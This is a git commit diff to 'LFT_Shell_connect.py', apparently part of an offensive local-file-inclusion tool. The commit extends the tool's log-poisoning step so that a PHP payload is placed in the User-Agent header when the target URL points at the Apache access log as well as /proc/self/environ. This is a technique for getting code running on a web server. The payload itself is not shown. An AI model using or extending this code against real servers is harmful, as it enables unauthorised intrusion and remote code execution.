67da6599946bac893dfdf0ce52500f350a6a0cde
jac11 <jac11devel@gmail.com>
2022-10-22 20:04:12 -0400

    Update LFT_Shell_connect.py

--- Package/LFT_Shell_connect.py
+++ Package/LFT_Shell_connect.py
@@ -23,7 +23,8 @@ class Shell_conncet:
             request.set_handle_robots(False)
             request.set_handle_redirect(True)
             request.set_handle_refresh(True, max_time=1)  
-            if "proc/self/environ" in self.url:
+            if "proc/self/environ" in self.url or \
+            "/var/log/apache2/access.log" in self.url  :
                 request.addheaders = [('User-agent', 'Mozilla/5.0'+self.paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                     Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                     ('Cookie',str(self.Cookie).replace('\n','')),
